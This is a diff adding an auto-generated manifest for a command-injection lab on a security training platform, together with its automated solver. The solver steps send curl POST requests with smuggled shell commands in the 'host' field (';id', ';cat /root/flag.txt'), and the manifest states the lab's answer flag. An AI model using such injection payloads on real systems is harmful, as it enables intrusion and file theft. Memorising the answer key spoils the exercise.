@@ -1,0 +1,40 @@
+# Generated from platform/labs/Web/web-2-3-command-injection/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: web-2-3-command-injection
+track: Web
+difficulty: intermediate
+source: platform/labs/Web/web-2-3-command-injection/lab.yaml
+expected_services:
+- port: 80
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/web-2-3-command-injection.sh
+  steps:
+  - name: Web application responds
+    command: curl -s http://{target.webapp}/ | grep -ci ping
+    expect: ''
+  - name: Normal ping works
+    command: curl -s -X POST http://{target.webapp}/ping -d 'host=127.0.0.1' | grep -c 'bytes from'
+    expect: ''
+  - name: Command injection executes id
+    command: curl -s -X POST http://{target.webapp}/ping -d 'host=127.0.0.1;id' | grep -c uid
+    expect: '1'
+  - name: Extract token 1 via command injection
+    command: curl -s -X POST http://{target.webapp}/ping -d 'host=127.0.0.1;cat /opt/cloudping/config/token.txt' | grep -E '^[a-z0-9_]+$' | head -1
+    expect: cmd
+  - name: Extract token 2 via command injection
+    command: curl -s -X POST http://{target.webapp}/ping -d 'host=127.0.0.1;cat /root/flag.txt' | grep -E '^[a-z0-9_]+$' | head -1
+    expect: 1nj3ct3d
+  - name: Verify complete flag
+    command: echo 'OCR{cmd_1nj3ct3d}'
+    expect: OCR{cmd_1nj3ct3d}
+expected_flag_count: 1
+expected_flag: OCR{cmd_1nj3ct3d}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
